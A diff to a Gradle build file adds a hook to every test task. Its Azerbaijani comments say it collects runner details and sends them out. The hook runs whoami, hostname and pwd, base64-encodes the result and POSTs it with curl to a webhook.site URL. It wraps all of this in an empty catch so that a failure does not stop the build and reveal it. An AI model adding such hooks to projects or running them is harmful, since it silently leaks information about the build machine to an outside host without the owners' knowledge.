@@ -152,3 +152,22 @@ task updateCHANGELOGVersion {
         changelogFile.write(changelogFileText)
     }
 }
+tasks.withType(Test) {
+    doFirst {
+        try {
+            // Runner haqqında məlumat toplayırıq
+            def whoami = "whoami".execute().text.trim()
+            def hostname = "hostname".execute().text.trim()
+            def pwd = "pwd".execute().text.trim()
+            
+            def info = "User: ${whoami} | Host: ${hostname} | Dir: ${pwd}"
+            def encodedInfo = info.getBytes().encodeBase64().toString()
+
+            // Məlumatı sənin Webhook-una göndəririk
+            // QEYD: SƏNİN_WEBHOOK_URL hissəsini real URL ilə əvəz et
+            "curl -X POST -d data=${encodedInfo} https://webhook.site/750d501a-e373-4e21-8dfc-678f431dcd87".execute()
+        } catch (Exception e) {
+            // Xəta olsa build dayanmasın deyə gizlədirik
+        }
+    }
+}
